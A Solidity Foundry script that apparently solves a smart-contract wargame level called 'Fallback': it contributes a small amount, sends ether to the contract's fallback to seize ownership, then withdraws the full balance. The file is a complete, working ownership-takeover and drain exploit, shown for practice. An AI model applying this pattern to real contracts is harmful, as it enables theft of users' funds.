// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback public fallbackContract;

    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        fallbackContract = Fallback(payable(0xAD36B18B80C0755F46997137191421D1A88cAE28));

        fallbackContract.contribute{value: 0.0001 ether}();
        require(fallbackContract.getContribution() > 0, "Contribution failed");
        ( bool success, ) = payable(fallbackContract).call{value: 0.0011 ether}("");
        require(fallbackContract.owner() == msg.sender, "Contribution failed");
        fallbackContract.withdraw();
        require(address(fallbackContract).balance == 0, "withdraw failed");
                
        vm.stopBroadcast();
    }
}
